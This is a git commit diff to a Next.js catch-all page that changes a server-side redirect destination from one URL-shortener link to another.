929fc110123d322db37159e1ae2c7745bd0299f1
Alyan1112 <132790646+Alyan1112@users.noreply.github.com>
2023-07-31 10:29:22 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://shorturl.at/egiot/`
+					`https://tinyurl.com/2ucjjuja/`
 				}`,
 			},
 		};
